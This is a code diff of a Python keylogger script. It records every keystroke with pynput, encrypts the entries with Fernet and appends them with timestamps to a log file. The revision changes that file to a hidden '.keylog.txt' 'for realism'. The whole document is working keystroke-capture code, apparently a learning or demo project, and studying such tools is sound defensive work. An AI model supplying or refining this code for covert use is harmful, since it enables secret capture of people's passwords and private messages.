@@ -1,45 +1,45 @@
-# This script captures keystrokes, encrypts them using the Fernet key,
-# and writes them to a local log file securely with timestamps.
+# keylogger.py — Captures keystrokes, encrypts with Fernet, logs with timestamps
 
-from pynput import keyboard                  # For capturing keystrokes
-from cryptography.fernet import Fernet       # For encrypting the logs
-from datetime import datetime                # For adding timestamps
-import base64                                # For safe storage of encrypted bytes
+from pynput import keyboard
+from cryptography.fernet import Fernet
+from datetime import datetime
+import base64
+import os
+import sys
 
-# Step 1: Load the encryption key from key.key
-with open("key.key", "rb") as key_file:
+# Step 1: Load encryption key
+key_path = "key.key"
+if not os.path.exists(key_path):
+    print("❌ Encryption key not found. Please run keygen.py first.")
+    sys.exit(1)
+
+with open(key_path, "rb") as key_file:
     key = key_file.read()
 
-fernet = Fernet(key)  # Create a Fernet encryption object using the key
+fernet = Fernet(key)
 
-# Step 2: Log file name
-log_file = "keylog.txt"
+# Step 2: Output log file
+log_file = ".keylog.txt"  # Hidden log file for realism
 
-# Step 3: Function to encrypt and save logs with timestamp
+# Step 3: Encrypt and write log
 def write_encrypted_log(data):
-    # Add a timestamp to the log
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     log_entry = f"[{timestamp}] {data}\n"
-
-    # Encrypt the log entry
     encrypted = fernet.encrypt(log_entry.encode())
-
-    # Encode encrypted bytes to base64 before writing to file
     with open(log_file, "ab") as file:
         file.write(base64.b64encode(encrypted) + b"\n")
 
-# Step 4: Function called on each key press
+# Step 4: Key press handler
 def on_press(key):
+    if key == keyboard.Key.esc:
+        print("🛑 Keylogger stopped.")
+        return False
     try:
-        # Try to log character keys (like letters, numbers)
-        write_encrypted_log(str(key.char))
+        write_encrypted_log(key.char)
     except AttributeError:
-        # Log special keys (like space, enter, shift)
-        write_encrypted_log(str(key))
+        write_encrypted_log(f"[{key.name}]")
 
-# Step 5: Start listening for keystrokes
+# Step 5: Start listener
 print("🟢 Keylogger started. Press ESC to stop.")
-
-# Create a keyboard listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
